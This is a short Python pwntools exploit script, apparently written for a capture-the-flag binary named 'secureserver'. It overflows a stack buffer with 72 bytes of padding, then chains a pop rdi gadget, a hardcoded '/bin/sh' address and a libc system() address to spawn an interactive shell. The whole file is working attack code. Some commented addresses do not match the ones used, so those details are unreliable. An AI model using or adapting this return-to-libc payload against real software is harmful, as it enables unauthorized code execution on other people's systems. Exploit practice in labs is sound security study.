from pwn import *

#offset = 64+8 = 72
#binsh = 0x7ffff7f62e35
#sys = 0x7ffff7e18ab0 
#libc_base = 0x7ffff7c00000


elf = ELF("./secureserver")

''' 
1. pop rdi 
2. add binsh to stack
3. call syscall
'''

system = 0x7ffff7c00000 + 0x00000000058740

buff = b"\x90" * 72
buff += p64(0x40120b) #pop_rdi
buff += p64(0x7ffff7dcb42f)     #binsh
buff += p64(system)     #syscall

code = ''' b *0x40120b'''

# p = gdb.debug(elf.path, code)

p = process("./secureserver")

p.recvline()
p.recvline()


p.sendline(buff)

p.interactive()
